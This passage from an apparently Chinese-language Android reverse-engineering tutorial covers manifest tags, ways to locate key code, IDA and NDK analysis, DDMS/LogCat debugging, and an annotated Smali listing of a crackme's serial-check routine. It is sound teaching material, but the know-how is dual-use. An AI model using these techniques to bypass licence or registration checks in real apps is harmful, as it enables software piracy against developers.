class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;31&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;12&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">package</span>=<span class="string">&quot;com.example.crackme&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;31&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> </span></span><br><span class="line"><span class="tag">                 <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Crackme&quot;</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> </span></span><br><span class="line"><span class="tag">                  <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> </span></span><br><span class="line"><span class="tag">                  <span class="attr">android:name</span>=<span class="string">&quot;com.example.crackme.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-1-1-manifest标签"><a href="#5-1-1-manifest标签" class="headerlink" title="5.1.1 manifest标签"></a>5.1.1 manifest标签</h3><p>所有的XML文件都必须包含manifest标签，这是文件的根节点。它必须要包含application标签，并且指明<code>xmlns:android</code>和<code>package</code>属性。</p><h4 id="5-1-1-1-xmlns-android"><a href="#5-1-1-1-xmlns-android" class="headerlink" title="5.1.1.1 xmlns:android"></a>5.1.1.1 xmlns:android</h4><p>这个属性定义了Andrid命名空间，必须设置成”<a href="http://schemas.android.com/apk/res/android&quot;，不能手动修改。">http://schemas.android.com/apk/res/android&quot;，不能手动修改。</a></p><h4 id="5-1-1-2-package"><a href="#5-1-1-2-package" class="headerlink" title="5.1.1.2 package"></a>5.1.1.2 package</h4><p>这是一个完整的Java语言风格包名。包名由英文字母（大小写均可）、数字和下划线组成。每个独立的名字必须以字母开头。</p><p>构建APK的时候，构建系统使用这个属性来做两件事：</p><ul><li>生成<code>R.java</code>类时用这个名字作为命名空间（用于访问App的资源）。比如：package被设置成com.sample.teapot，那么生成的R类就是：com.sample.teapot.R</li><li>用来生成在manifest文件中定义的类的完整类名。比如package被设置成com.sample.teapot，并且activity元素被声明成<activity android:name=".MainActivity">，完整的类名就是com.sample.teapot.MainActivity。</li></ul><p>包名也代表着唯一的application ID，用来发布应用。但是，要注意的一点是：在APK构建过程的最后一步，package名会被build.gradle文件中的applicationId属性取代。如果这两个属性值一样，那么万事大吉，如果不一样，那就要小心了。</p><h4 id="5-1-1-3-adnroid-versionCode"><a href="#5-1-1-3-adnroid-versionCode" class="headerlink" title="5.1.1.3 adnroid:versionCode"></a>5.1.1.3 adnroid:versionCode</h4><p>内部的版本号。用来表明版本的更新。这个数字不会显示给用户。显示给用户的是android:versionName。这个数字必须是整数。不能用16进制，也就是说不接受”0x1”这种参数。</p><h4 id="5-1-1-4-android-versionName"><a href="#5-1-1-4-android-versionName" class="headerlink" title="5.1.1.4 android:versionName"></a>5.1.1.4 android:versionName</h4><p>显示给用户看的版本号。</p><h3 id="5-1-2-uses-feature标签"><a href="#5-1-2-uses-feature标签" class="headerlink" title="5.1.2 uses-feature标签"></a>5.1.2 uses-feature标签</h3><p>uses-feature标签是manifest标签里的元素，Google Play利用这个标签的值从不符合应用需要的设备上将应用过滤。</p><p>它的作用是将App所依赖的硬件或者软件条件告诉别人，说明了App的哪些功能可以随设备的变化而变化。</p><p>使用的时候要注意，必须在单独的<uses-feature>元素中指定每个功能，如果要多个功能，需要多个<uses-feture>元素。比如要求设备同时具有蓝牙和相机功能：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.bluetooth&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.camera&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h4 id="5-1-2-1-android-name"><a href="#5-1-2-1-android-name" class="headerlink" title="5.1.2.1 android:name"></a>5.1.2.1 android:name</h4><p>该属性以字符串形式指定了APP要用的硬件或软件功能。</p><h4 id="5-1-2-2-android-required"><a href="#5-1-2-2-android-required" class="headerlink" title="5.1.2.2 android:required"></a>5.1.2.2 android:required</h4><p>这项属性如果值为true表示需要这项功能，否则应用无法工作，如果为false表示应用在必要时会使用该功能，但是如果没有此功能应用也能工作。</p><h4 id="5-1-2-3-android-glEsVersion"><a href="#5-1-2-3-android-glEsVersion" class="headerlink" title="5.1.2.3 android:glEsVersion"></a>5.1.2.3 android:glEsVersion</h4><p>指明应用需要的Opengl ES版本。高16位表示主版本号，低16位表示次版本号。例如，如果是要3.2的版本，就是0x00030002。如果定义多个glEsVersion，应用会自动启用最高的设置。</p><h3 id="5-1-3-application标签"><a href="#5-1-3-application标签" class="headerlink" title="5.1.3 application标签"></a>5.1.3 application标签</h3><p>该标签也是manifest标签中的一个元素，描述了应用的配置。这是一个必备的元素，它包含了很多子元素来描述应用的组件，它的属性影响到所有的子组件。许多属性（例如icon、label、permission、process、taskAffinity和allowTaskReparenting）都可以设置成默认值。</p><h4 id="5-1-3-1-android-allowBackup"><a href="#5-1-3-1-android-allowBackup" class="headerlink" title="5.1.3.1 android:allowBackup"></a>5.1.3.1 android:allowBackup</h4><p>表示是否允许App加入到备份还原的结构中。如果设置成false，那么应用就不会备份还原。默认值为true。</p><h4 id="5-1-3-2-android-fullBackupContent"><a href="#5-1-3-2-android-fullBackupContent" class="headerlink" title="5.1.3.2 android:fullBackupContent"></a>5.1.3.2 android:fullBackupContent</h4><p>这个属性指向了一个XML文件，该文件中包含了在进行自动备份时的完全备份规则。这些规则定义了哪些文件需要备份。此属性是一个可选属性。默认情况下，自动备份包含了大部分App文件。</p><h4 id="5-1-3-3-android-supportsRtl"><a href="#5-1-3-3-android-supportsRtl" class="headerlink" title="5.1.3.3 android:supportsRtl"></a>5.1.3.3 android:supportsRtl</h4><p>声明App是否支持RTL（Right To  Left）布局。如果设置成true，并且targetSdkVersion被设置成17或更高。很多RTL  API会被集火，这样你的应用就可以显示RTL布局了。如果设置成false或者targetSdkVersion被设置成16或更低，RTL  API就不起作用了。该属性的默认的值是false。</p><h4 id="5-1-3-4-android-icon"><a href="#5-1-3-4-android-icon" class="headerlink" title="5.1.3.4 android:icon"></a>5.1.3.4 android:icon</h4><p>App的图标，以及每个组件的默认图标。可以在组件中自定义图标。这个属性必须设置成一个引用，指向一个可绘制的资源，这个资源必须包含图片。系统不设置默认图标。</p><h4 id="5-1-3-5-android-label"><a href="#5-1-3-5-android-label" class="headerlink" title="5.1.3.5 android:label"></a>5.1.3.5 android:label</h4><p>一个用户可读的标签，以及所有组件的默认标签。子组件可以用它们的label属性定义自己的标签，如果没有定义，那么就用这个标签。</p><p>标签必须设置成一个字符串资源的引用。这样它们就能和其他东西一样被定位，比如@string/app_name。当然，为了开发方便，你也可以定义一个原始字符串。</p><h4 id="5-1-3-6-android-theme"><a href="#5-1-3-6-android-theme" class="headerlink" title="5.1.3.6 android:theme"></a>5.1.3.6 android:theme</h4><p>该属性定义了应用使用的主题的，它是一个指向style资源的引用。各个activity也可以用自己的theme属性设置自己的主题。</p><h4 id="5-1-3-7-android-name"><a href="#5-1-3-7-android-name" class="headerlink" title="5.1.3.7 android:name"></a>5.1.3.7 android:name</h4><p>Application子类的全名。包括前面的路径。例如com.sample.teapot.TeapotApplication。当应用启动时，这个类的实例被第一个创建。这个属性是可选的，大多数APP都不需要这个属性。在没有这个属性的时候，Android会启动一个Application类的实例。</p><h3 id="5-1-4-activity标签"><a href="#5-1-4-activity标签" class="headerlink" title="5.1.4 activity标签"></a>5.1.4 activity标签</h3><p>activity标签是application标签中的一个元素，声明一个实现应用可视化界面的Activity（Activity类子类）。这是application标签中必要的子标签。所有Activity都必须由清单文件中的activity标签表示。任何未在该处声明的Activity对系统都不可见，并且永远不会被执行。</p><h4 id="5-1-4-1-android-name"><a href="#5-1-4-1-android-name" class="headerlink" title="5.1.4.1 android:name"></a>5.1.4.1 android:name</h4><p>Activity类的名称，是Activity类的子类。该属性值为完全限定类名称，例如com.sample.teapot.TeapotNativeActivity。为了方便起见，如果第一个字符是点（’.’），就需要加上manifest标签中的包名。应用一旦发布，不应更改该名称。该元素没有默认值，必须指定该名称。</p><h4 id="5-1-4-2-android-label"><a href="#5-1-4-2-android-label" class="headerlink" title="5.1.4.2 android:label"></a>5.1.4.2 android:label</h4><p>Activity标签，可以被用户读取。该标签会在Activity激活时显示在屏幕上。如果未设置，用application中的label属性。对属性的设置要求和application中一样。</p><h4 id="5-1-4-3-android-configChanges"><a href="#5-1-4-3-android-configChanges" class="headerlink" title="5.1.4.3 android:configChanges"></a>5.1.4.3 android:configChanges</h4><p>列出 Activity 将自行处理的配置更改消息。在运行时发生配置更改时，默认情况下会关闭 Activity 然后将其重新启动，但使用该属性声明配置将阻止 Activity 重新启动。 Activity 反而会保持运行状态，并且系统会调用其 onConfigurationChanged()方法。</p><p>注：应避免使用该属性，并且只应在万不得已的情况下使用。</p><p>该属性可以设置的项很多，这里列出常用的项：</p><ul><li><p>orientation<br> 屏幕方向发生了变化，比如用户旋转了设备</p></li><li><p>keyboardHidden<br> 键盘无障碍功能发生了变化，比如用户显示了硬件键盘</p></li><li><p>android:launchMode<br> 关于如何启动Activity的指令。一共有四种指令：<br> “standard”<br> “singleTop”<br> “singleTask”<br> “singleInstance”<br>默认情况下是standard。这些模式被分为两大类：</p><p>“standard”和”singleTop”是一类。该模式的Activity可以多次实例化。实例可属于任何任务，并且可以位于Activity堆栈中的任何位置。</p><p>“singleTask”和”singleInstance”是一类。该模式只能启动任务，它们始终位于Activity堆栈的根位置。此外，设备一次只能保留一个Activity实例。</p><p>设置成singleTask后，系统在新任务的根位置创建Activity并向其传送Intent。如果已经存在一个Activity实例，则系统会通过调用该实例的onNewIntent()方法向其传送Intent而不是创建一个新的Activity实例。</p></li></ul><h4 id="5-1-4-4-android-theme"><a href="#5-1-4-4-android-theme" class="headerlink" title="5.1.4.4 android:theme"></a>5.1.4.4 android:theme</h4><p>设定主题格式，与application标签中的theme属性类似。</p><h3 id="5-1-5-meta-data标签"><a href="#5-1-5-meta-data标签" class="headerlink" title="5.1.5 meta-data标签"></a>5.1.5 meta-data标签</h3><p>activity标签中的元素，指定额外的数据项，该数据项是一个name-value对，提供给其父组件。这些数据会组成一个Bundle对象，可以由PackageItemInfo.metaData字段使用。虽然可以使用多个meta-data标签，但是不推荐这么使用。如果有多个数据项要指定，推荐做法是：将多个数据项合并成一个资源，然后使用一个meta-data标签包含进去。</p><p>该标签有三个属性：</p><ul><li>android:name：数据项名称，这是一个唯一值。</li><li>android:resource：一个资源的引用。</li><li>android:value：数据项的值。</li></ul><h3 id="5-1-6-intent-filter标签"><a href="#5-1-6-intent-filter标签" class="headerlink" title="5.1.6 intent-filter标签"></a>5.1.6 intent-filter标签</h3><p>activity标签中的元素，指明这个activity可以以什么样的意图(intent)启动。</p><h3 id="5-1-7-action标签"><a href="#5-1-7-action标签" class="headerlink" title="5.1.7 action标签"></a>5.1.7 action标签</h3><p>intent-filter标签中的元素，表示activity作为一个什么动作启动，android.intent.action.MAIN表示作为主activity启动。</p><h3 id="5-1-8-category标签"><a href="#5-1-8-category标签" class="headerlink" title="5.1.8 category标签"></a>5.1.8 category标签</h3><p>intent-filter标签中的元素，这是action元素的额外类别信息，android.intent.category.LAUNCHER表示这个activity为当前应用程序优先级最高的Activity。</p><img src="/posts/d368aa06/5.1.2.png" class="" title="总结"><h2 id="5-2-定位关键代码的6种方法"><a href="#5-2-定位关键代码的6种方法" class="headerlink" title="5.2 定位关键代码的6种方法"></a>5.2 定位关键代码的6种方法</h2><ul><li><p>信息反馈法</p><p>运行目标程序，然后根据程序运行时给出的反馈信息作为突破口寻找关键代码。比如在2.2时破解程序就是通过“注册失败”信息来定位关键代码的。通常情况下，程序中用到的字符串会存储在<code>strings.xml</code>文件或硬编码到程序代码中。如果是前者，字符串在程序中会以id的形式访问，只需在反汇编代码中搜索字符串的id值即可找到调用代码处；如果是后者，在反汇编代码中直接搜索字符串即可。</p></li><li><p>特征函数法</p><p>这种定位代码的方法与信息反馈法类似。在信息反馈法中，无论程序给出什么样的反馈信息，终究是需要调用Android SDK中提供的相关API函数来完成的。比如弹出“注册失败”的提示信息就需要调用<code>Toast.MakeText().Show()</code>方法，在反汇编代码中直接搜索Toast应该很快就能定位到调用代码。</p></li><li><p>顺序查看法</p><p>顺序查看法是指从软件的启动代码开始，逐行向下分析，掌握软件的执行流程，这种分析方法在病毒分析时经常用到。</p></li><li><p>代码注入法</p><p>属于动态调试，它的原理是手动修改APK文件的反汇编代码，加入Log输出，配合LogCat查看程序执行到特定点时的状态数据。这种方法在解密程序数据时经常使用。</p></li><li><p>栈跟踪法</p><p>动态调试方法，它的原理是输出运行时的栈跟踪信息，然后查看栈上的函数调用序列来理解方法的执行流程。</p></li><li><p>Method Profiling</p><p>Method Profiling（方法剖析）属于动态调试，主要用于热点分析和性能优化。该功能除了可以记录每个函数占用的CPU时间之外，还能够跟踪所有的函数调用关系，并提供比栈跟踪法更详细的函数调用序列报告。</p></li></ul><h2 id="5-3-使用IDA-Pro静态分析Android程序"><a href="#5-3-使用IDA-Pro静态分析Android程序" class="headerlink" title="5.3 使用IDA Pro静态分析Android程序"></a>5.3 使用IDA Pro静态分析Android程序</h2><p>使用IDA Pro分析DEX文件与使用AK分析APK文件都是差不多的，看的都是Smali代码，而且IDA需要手动解压APK文件提取出DEX文件，修改完后还需打包签名，所以用AK不香吗？希望IDA以后能打我脸。</p><h1 id="6-Android-NDK程序"><a href="#6-Android-NDK程序" class="headerlink" title="6. Android NDK程序"></a>6. Android NDK程序</h1><h2 id="6-1-Android原生程序与Android-NDK程序的区别"><a href="#6-1-Android原生程序与Android-NDK程序的区别" class="headerlink" title="6.1 Android原生程序与Android NDK程序的区别"></a>6.1 Android原生程序与Android NDK程序的区别</h2><p>原生程序应该是Java编写的，Android NDK程序是通过JNI(Java Native Interface)提供的API函数将原生C/C++代码与Java代码进行数据交换，使得使用C/C++代码也能写出功能强大的程序，甚至将大部分的Java代码转移到C/C++代码中来。</p><p>静态分析Android NDK程序与分析传统的原生程序有些不同，传统的原生程序中只调用了原生API函数，使用IDA Pro分析它们时会被自动识别出来，因此分析的难度转移到了理解ARM指令集序列的含义上。而Android NDK程序使用了JNI接口函数，在分析它们时IDA Pro并不能识别它们，这使得分析工作变得比较艰难。</p><h2 id="6-2-分析Android-NDK程序"><a href="#6-2-分析Android-NDK程序" class="headerlink" title="6.2 分析Android NDK程序"></a>6.2 分析Android NDK程序</h2><p>如果使用C++代码来调用JNI接口函数，JNIEnv被定义成了_JNIEnv结构体，该结构体的第一个字段就是一个JNINativeInterface结构体的指针。</p><p>如果C代码调用JNI接口函数，JNIEnv则直接被定义成JNINativeInterface结构体的指针。</p><p>因此可以将JNIEnv的首地址解释成JNINativeInterface的首地址来使用，通过首地址加上索引值就能找到具体的函数。</p><h1 id="7-动态调试Android程序"><a href="#7-动态调试Android程序" class="headerlink" title="7. 动态调试Android程序"></a>7. 动态调试Android程序</h1><p>DDMS(Dalvik Debug Monitor Server，Dalvik调试监视器服务)提供了设备截屏、查看运行的线程信息、文件浏览、LogCat、Method Profiling、广播状态信息、模拟电话呼叫、接收SMS、虚拟地理坐标等功能。它的文件浏览、LogCat、Method Profiling是使用最多的功能。文件浏览可以查看需要分析的程序在安装目录下生成的文件，分析这些文件的内容可以对程序的设置及生成的数据有初步的了解；LogCat则可以输出软件运行时的调试信息；Method Profilng用于跟踪程序的执行流程。</p><p>在Android SDK的tools目录下有一个<code>ddms.bat</code>，它就是DDMS的启动文件。</p><h2 id="7-1-使用LogCat查看调试信息"><a href="#7-1-使用LogCat查看调试信息" class="headerlink" title="7.1 使用LogCat查看调试信息"></a>7.1 使用LogCat查看调试信息</h2><p>Android SDK提供了android.util.Log类来输出调试信息。该类提供了<code>Log.v()</code>、<code>Log.d()</code>、<code>Log.i()</code>、<code>Log.w()</code>以及<code>Log.e()</code>等5个调试信息输出方法。</p><ul><li>v表示输出VERBOSE类型的信息</li><li>d表示输出DEBUG类型的信息</li><li>i表示输出INFO类型的信息</li><li>w表示输出WARN类型的信息</li><li>e表示输出ERROR类型的信息</li></ul><p>启动Android设备，就可在DDMS中查看该设备所有运行中的进程。</p><img src="/posts/d368aa06/7.1.1.jpg" class="" title="DDMS查看Android设备进程"><p>去AS中查看LogCat信息会更加详细。</p><h2 id="7-2-定位关键代码"><a href="#7-2-定位关键代码" class="headerlink" title="7.2 定位关键代码"></a>7.2 定位关键代码</h2><h3 id="7-2-1-代码注入法"><a href="#7-2-1-代码注入法" class="headerlink" title="7.2.1 代码注入法"></a>7.2.1 代码注入法</h3><p>通常一个程序在发布时不会保留Log输出信息，要想在程序的特定位置输出信息还需手动进行代码注入，所谓代码注入是指首先反编译Android程序，然后在反汇编出的Smali文件中添加Log调用的代码，最后重新打包程序运行来查看输出结果。</p><p>同样分析<code>app-debug.apk</code>中的Smali代码，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line">.method private checkSN(Ljava/lang/String;Ljava/lang/String;)Z</span><br><span class="line">    .locals 11</span><br><span class="line">    .param p1, &quot;username&quot;    # Ljava/lang/String;</span><br><span class="line">    .param p2, &quot;sn&quot;    # Ljava/lang/String;</span><br><span class="line">    .annotation system Ldalvik/annotation/MethodParameters;</span><br><span class="line">        accessFlags = &#123;</span><br><span class="line">            0x0,</span><br><span class="line">            0x0</span><br><span class="line">        &#125;</span><br><span class="line">        names = &#123;</span><br><span class="line">            &quot;username&quot;,</span><br><span class="line">            &quot;sn&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    .end annotation</span><br><span class="line"></span><br><span class="line">    .line 39</span><br><span class="line">    const/4 v0, 0x0</span><br><span class="line"></span><br><span class="line">    if-eqz p1, :cond_7#检查username是否为空</span><br><span class="line"></span><br><span class="line">    :try_start_0</span><br><span class="line">    invoke-virtual &#123;p1&#125;, Ljava/lang/String;-&gt;length()I#获取username长度</span><br><span class="line"></span><br><span class="line">    move-result v1</span><br><span class="line"></span><br><span class="line">    if-nez v1, :cond_0#检查username长度是否为0</span><br><span class="line"></span><br><span class="line">    goto/16 :goto_3</span><br><span class="line"></span><br><span class="line">    .line 41</span><br><span class="line">    :cond_0</span><br><span class="line">    if-eqz p2, :cond_6#检查sn是否为空</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p2&#125;, Ljava/lang/String;-&gt;length()I#获取sn长度</span><br><span class="line"></span><br><span class="line">    move-result v1</span><br><span class="line"></span><br><span class="line">    const/16 v2, 0x10#v2=16</span><br><span class="line"></span><br><span class="line">    if-eq v1, v2, :cond_1#判断sn长度是否为16</span><br><span class="line"></span><br><span class="line">    goto :goto_2</span><br><span class="line"></span><br><span class="line">    .line 43</span><br><span class="line">    :cond_1</span><br><span class="line">    const-string v1, &quot;MD5&quot;</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;v1&#125;, Ljava/security/MessageDigest;-&gt;getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;</span><br><span class="line"></span><br><span class="line">    move-result-object v1</span><br><span class="line"></span><br><span class="line">    .line 44</span><br><span class="line">    .local v1, &quot;digest&quot;:Ljava/security/MessageDigest;</span><br><span class="line">    invoke-virtual &#123;v1&#125;, Ljava/security/MessageDigest;-&gt;reset()V</span><br><span class="line"></span><br><span class="line">    .line 45</span><br><span class="line">    invoke-virtual &#123;p1&#125;, Ljava/lang/String;-&gt;getBytes()[B#将username转换为字节数组</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v1, v2&#125;, Ljava/security/MessageDigest;-&gt;update([B)V</span><br><span class="line"></span><br><span class="line">    .line 46</span><br><span class="line">    invoke-virtual &#123;v1&#125;, Ljava/security/MessageDigest;-&gt;digest()[B#username进行MD5摘要运算</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    .line 47</span><br><span class="line">    .local v2, &quot;bytes&quot;:[B</span><br><span class="line">    new-instance v3, Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v3&#125;, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    .line 48</span><br><span class="line">    .local v3, &quot;sb1&quot;:Ljava/lang/StringBuilder;</span><br><span class="line">    new-instance v4, Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v4&#125;, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    .line 49</span><br><span class="line">    .local v4, &quot;sb2&quot;:Ljava/lang/StringBuilder;</span><br><span class="line">    array-length v5, v2#v5取username进行MD5摘要结果的长度</span><br><span class="line"></span><br><span class="line">    const/4 v6, 0x0#v6=0</span><br><span class="line"></span><br><span class="line">    :goto_0</span><br><span class="line">    const/4 v7, 0x1#v7=1</span><br><span class="line"></span><br><span class="line">    if-ge v6, v5, :cond_3</span><br><span class="line"></span><br><span class="line">    aget-byte v8, v2, v6#从v2中取下标为6的字节存入v8</span><br><span class="line"></span><br><span class="line">    .line 51</span><br><span class="line">    .local v8, &quot;b&quot;:B</span><br><span class="line">    and-int/lit16 v9, v8, 0xff#v8与0xff相与存入v9</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;v9&#125;, Ljava/lang/Integer;-&gt;toHexString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v9</span><br><span class="line"></span><br><span class="line">    .line 52</span><br><span class="line">    .local v9, &quot;hexstr&quot;:Ljava/lang/String;</span><br><span class="line">    invoke-virtual &#123;v9&#125;, Ljava/lang/String;-&gt;length()I#获取v9的长度存到v10</span><br><span class="line"></span><br><span class="line">    move-result v10</span><br><span class="line"></span><br><span class="line">    if-ne v10, v7, :cond_2#如果长度为1，继续往下执行</span><br><span class="line"></span><br><span class="line">    .line 54</span><br><span class="line">    new-instance v7, Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v7&#125;, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    const-string v10, &quot;0&quot;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v7, v10&#125;, 